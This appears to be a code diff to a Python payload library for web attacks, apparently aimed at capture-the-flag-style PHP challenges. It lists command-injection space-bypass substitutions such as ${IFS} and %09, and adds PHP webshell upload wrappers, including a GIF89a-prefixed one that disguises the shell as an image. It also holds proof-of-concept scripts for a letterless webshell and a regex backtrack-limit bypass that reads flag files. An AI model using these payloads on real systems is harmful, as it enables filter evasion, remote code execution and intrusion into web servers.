@@ -143,15 +143,16 @@ HEADER_EXEC_TEMPLATES = [
 ]
 
 # 空格绕过
-SPACE_BYPASS_TEMPLATES = [
-    "{payload}".replace(" ", "${IFS}"),
-    "{payload}".replace(" ", "$IFS$9"),
-    "{payload}".replace(" ", "/**/"),
-    "{payload}".replace(" ", "<>"),
-    "{payload}".replace(" ", "<"),
-    "{payload}".replace(" ", "%20"),
-    "{payload}".replace(" ", "%09"),
-    "{payload}".replace(" ", "%a0"),
+SPACE_BYPASS_REPLACEMENTS = [
+    "\\t",
+    "${IFS}",
+    "$IFS$9",
+    "/**/",
+    "<>",
+    "<",
+    "%09",
+    "%20",
+    "%a0",
 ]
 
 # 无字母webshell
@@ -173,7 +174,7 @@ SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS = [
 SPECIAL_UPLOAD_POC_EGS = """
 import requests
 
-url = ""
+url = " "
 
 params = {
     "shell":"?><?=`. /???/????????[@-[]`;?>"
@@ -192,7 +193,7 @@ for i in range(1,20):
 BACKTRACK_LIMIT_POC_EGS = """
 import requests
 
-url = ""
+url = " "
 payload = '{"cmd":"?><?=`sort /f*`?>","+":"' + "-" * 1000000 + '"}'
 res = requests.post(url=url, data={"letter": payload})
 print(res.text)
@@ -225,6 +226,12 @@ UPLOAD_LEGACY_WRAPPER_TEMPLATES = [
     "<% {payload} %>",
     "<%={expr}%>",
     '<script language="php">{payload}</script>',
+]
+
+UPLOAD_SHELL_CMD_WRAPPER_TEMPLATES = [
+    "<?=`{cmd}`?>",
+    "<?= `{cmd}` ?>",
+    "GIF89a<?=`{cmd}`?>",
 ]
 
 # 反引号
